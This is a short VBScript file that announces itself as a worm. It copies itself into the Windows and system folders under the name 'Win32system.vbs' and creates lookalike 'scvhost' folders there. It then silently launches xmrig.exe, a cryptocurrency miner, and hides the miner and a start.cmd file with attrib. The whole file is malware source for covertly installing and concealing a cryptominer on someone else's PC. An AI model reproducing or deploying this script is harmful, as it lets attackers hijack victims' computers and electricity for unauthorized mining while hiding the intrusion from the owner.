On Error Resume Next
MsgBox "Now the Worm begin to hack your PC", ,"Warning" 
Set fso = CreateObject("Scripting.FileSystemObject")
Set colDrives = fso.Drives    
const Hidden = 2

Set dir1 = fso.GetSpecialFolder(0)
Set dir2 = fso.GetSpecialFolder(1)

MsgBox dir1, ,"Warning" 
MsgBox dir2, ,"Warning" 
WScript.Echo CreateObject("SCripting.FileSystemObject").GetFolder(".").Path
dim r
Set r=CreateObject("Wscript.Shell")

MsgBox CreateObject("SCripting.FileSystemObject").GetFolder(".").Path&"\scvhost", ,"Warning" 
fso.GetFile(Wscript.ScriptFullName).Copy(dir1&"\Win32system.vbs")
fso.GetFile(Wscript.ScriptFullName).Copy(dir2&"\Win32system.vbs")
fso.CreateFolder dir1&"\scvhost\"
fso.CreateFolder dir2&"\scvhost\"
fso.copyfile CreateObject("SCripting.FileSystemObject").GetFolder(".").Path&"\scvhost\*", dir1&"\scvhost\"
fso.copyfile CreateObject("SCripting.FileSystemObject").GetFolder(".").Path&"\scvhost\*", dir2&"\scvhost\"
MsgBox "Perpare to run the start.cmd", ,"Warning" 
r.run dir1&"\scvhost\xmrig.exe", 0
r.run "attrib +h "&dir1&"\scvhost\xmrig.exe", 0
r.run "attrib +h "&dir2&"\scvhost\start.cmd", 0